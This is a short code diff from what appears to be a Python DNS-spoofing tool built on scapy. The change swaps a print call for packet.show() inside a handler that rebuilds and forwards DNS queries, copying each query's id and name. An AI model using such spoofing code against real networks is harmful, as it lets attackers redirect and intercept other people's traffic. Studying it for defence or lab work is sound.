@@ -39,7 +39,7 @@ def dnsSpoofing(targetIP, spoofIP,sourceIP):
 
 def forwardDnsSpoofing():
     def forwardDNS(orgPacket: IP):
-        print(orgPacket)
+        orgPacket.show()
         packet = scapy.IP(dst='127.0.0.1') 
         packet= packet / scapy.UDP(sport=orgPacket[UDP].sport) 
         packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
